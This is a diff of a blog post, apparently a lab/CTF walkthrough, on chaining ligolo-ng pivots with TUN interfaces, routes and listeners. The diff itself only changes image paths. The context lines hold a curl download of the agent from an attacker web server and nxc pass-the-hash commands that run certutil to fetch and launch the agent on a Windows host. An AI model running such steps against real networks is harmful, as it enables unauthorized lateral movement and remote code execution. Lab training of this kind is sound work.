@@ -43,7 +43,7 @@ sudo ip link set ligolo3 up
 
 ### My Terminals
 Maybe not what you have come here for exactly but this post is about how I implement ligolo and  staying organized is a big part of it for me. That said, i use `Terminator` for my terminals.  It has some features that i use alot, but that may be another blog one day.  For today we will just focus on how it helps with ligolo.  When doing labs and CTF work i have many tabs open at once, and try to utilize them only for they are mean to be used for.  My ligolo tab houses any terminal window used to manage TUN interfaces.  Mainly, ligolo proxy and a terminal per ligolo agent.  Makes it super easy to bring them all back up if something fails.  Let's start ligolo and see what our space looks like.
-![](/_posts/res/ligolopivoting/Pasted image 20240627052707.png?raw=true)
+![](/_posts/res/ligolopivoting/Pasted%20image%2020240627052707.png?raw=true)
 *Ligolo started from our `loadables` (This is the web server root) directory*
 
 ## Initiate first pivot
@@ -58,7 +58,7 @@ curl http://10.10.15.252:8000/tools/ligolo/ligolo-ng_agent_linux_amd64/agent -0 
 
 With the agent connected we can start the tunnel.  We will use our first TUN interface for this.
 
-![](/_posts/res/ligolopivoting/Pasted image 20240627064200.png?raw=true)
+![](/_posts/res/ligolopivoting/Pasted%20image%2020240627064200.png?raw=true)
 *Selected the session. Started the tunnel on ligolo1 TUN interface.*
 
 Now all that is left for the first pivot is to add a route table entry on our attack machine.  The internal network on this lab is 172.16.1.0/24.
@@ -66,7 +66,7 @@ Now all that is left for the first pivot is to add a route table entry on our at
 ```bash
 sudo ip route add 172.16.1.0/24 dev ligolo1
 ```
-![](/_posts/res/ligolopivoting/Pasted image 20240627055507.png?raw=true)
+![](/_posts/res/ligolopivoting/Pasted%20image%2020240627055507.png?raw=true)
 
 Thats pivot one. Lets move on.
 
@@ -78,7 +78,7 @@ To setup the listener we will make sure the first session is selected (I know we
 ```bash
 listener_add --addr 0.0.0.0:443 --to 127.0.0.1:11601
 ```
-![](/_posts/res/ligolopivoting/Pasted image 20240627064457.png?raw=true)
+![](/_posts/res/ligolopivoting/Pasted%20image%2020240627064457.png?raw=true)
 - --addr 0.0.0.0:443 sets up the listener interface and port on our pivot host
 	- Using the all interfaces 0.0.0.0 is kind of lazy. this first pivot host does have multiple ips and we only really need this to run on one but .... meh. I may show a good reason later for this to be the internal address
 - --to defines where the traffic destined for 443 on 0.0.0.0 will be sent to 
@@ -89,17 +89,17 @@ With that out of the way, let's get our ligolo agent on this Windows box and con
 ```bash
 nxc smb 172.16.1.254 -u user -H hash -x 'certutil -f -urlcache http://10.10.15.252:8000/tools/ligolo/ligolo-ng_agent_windows_amd64/agent.exe c:\windows\system32\agent.exe'
 ```
-![](/_posts/res/ligolopivoting/Pasted image 20240627062722.png?raw=true)
+![](/_posts/res/ligolopivoting/Pasted%20image%2020240627062722.png?raw=true)
 
 ```bash
 nxc smb 172.16.1.254 -u user -H hash -x 'c:\windows\system32\agent.exe -connect 172.16.1.23:443 -ignore-cert'
 ```
 
 Now we select the session and start it on the ligolo2 TUN.
-![](/_posts/res/ligolopivoting/Pasted image 20240627063703.png?raw=true)
+![](/_posts/res/ligolopivoting/Pasted%20image%2020240627063703.png?raw=true)
 
 I know that a portion of that subnet is not available from this pivot host.  I will act like i don't know that and then we will fix the routing later. 
-![](/_posts/res/ligolopivoting/Pasted image 20240627063949.png?raw=true)
+![](/_posts/res/ligolopivoting/Pasted%20image%2020240627063949.png?raw=true)
 
 ## Initiate third pivot
 So we are already routing 172.16.2.0/24 over ligolo2 and this pivot is going to be a pivot to that same range but only available from this pivot host.  i want to maintain the integrity of my forwarding chain while still making it to this section of the network. 
@@ -111,7 +111,7 @@ sudo ip route add 172.16.2.102/32 dev ligolo2
 # Remove subnet route
 sudo ip route del 172.16.2.0/24
 ```
-![](/_posts/res/ligolopivoting/Pasted image 20240627065656.png?raw=true)
+![](/_posts/res/ligolopivoting/Pasted%20image%2020240627065656.png?raw=true)
 
 Now let's prepare a listener on our second pivot host session to connect this third pivot agent to. (I know. I'm sorry.)
 ```bash
@@ -135,7 +135,7 @@ Because I know what host is behind ligolo3 I can just add a host route (/32) to 
 ```bash
 sudo ip route add 172.16.2.12/32 dev ligolo3
 ```
-![](/_posts/res/ligolopivoting/Pasted image 20240627071910.png?raw=true)
+![](/_posts/res/ligolopivoting/Pasted%20image%2020240627071910.png?raw=true)
 
 ## Closing Thoughts
 - Had i used specific IPs when setting up the listeners instead of 0.0.0.0 then when issuing the listener_list command in ligolo it would be easier to follow the trail
